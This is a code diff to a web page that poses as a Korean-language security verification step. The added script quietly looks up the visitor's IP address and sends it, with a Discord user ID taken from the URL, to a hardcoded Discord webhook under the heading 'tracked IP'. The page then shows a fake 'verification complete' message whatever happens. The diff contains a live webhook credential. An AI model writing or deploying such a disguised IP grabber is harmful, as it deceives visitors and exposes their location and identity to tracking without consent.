@@ -52,30 +52,46 @@
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        const userId = urlParams.get('user_id');
+        const userId = urlParams.get('user_id') || "알 수 없음";
+
+        // 네가 준 실제 디스코드 웹훅 주소 넣기
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1565687242041597962/4a88OaMlBrvVYqMUAPaSiWxK4XAX4tvwNp1pMkVZxz6NLdl5i5_twLkbdT03j1ZjwtyI";
 
         async function verifyUser() {
             try {
-                // ipify를 통해 IP를 가져온 뒤, 우리 서버나 로그 수집용으로 전달
+                // 1. ipify로 유저 IP 가져오기
                 let ipRes = await fetch('https://api.ipify.org?format=json');
                 let ipData = await ipRes.json();
                 let userIp = ipData.ip;
 
-                // 콘솔에 찍히는지 확인용 (나중에 확인 가능)
-                console.log("User ID:", userId, "IP:", userIp);
-
-                // 2.5초 뒤 성공 화면 전환
-                setTimeout(() => {
-                    document.getElementById('loadingSpinner').style.display = 'none';
-                    document.getElementById('titleText').innerText = "보안 인증 완료";
-                    document.getElementById('descText').style.display = 'none';
-                    document.getElementById('successText').style.display = 'block';
-                }, 2500);
+                // 2. 디스코드 웹훅으로 전송 (CORS 우회를 위해 no-cors 또는 일반 fetch 시도)
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🎯 유저 IP 및 인증 접속 감지",
+                            color: 16744192, // 주황색
+                            fields: [
+                                { name: "디스코드 유저 ID (UUID)", value: `\`${userId}\``, inline: false },
+                                { name: "추적된 IP 주소", value: `\`${userIp}\``, inline: false }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
 
             } catch (e) {
-                document.getElementById('titleText').innerText = "보안 확인 실패";
-                document.getElementById('descText').innerText = "페이지를 새로고침하거나 다시 시도해 주세요.";
+                console.error(e);
             }
+
+            // 3. 2.5초 뒤 성공 화면 전환
+            setTimeout(() => {
+                document.getElementById('loadingSpinner').style.display = 'none';
+                document.getElementById('titleText').innerText = "보안 인증 완료";
+                document.getElementById('descText').style.display = 'none';
+                document.getElementById('successText').style.display = 'block';
+            }, 2500);
         }
 
         verifyUser();
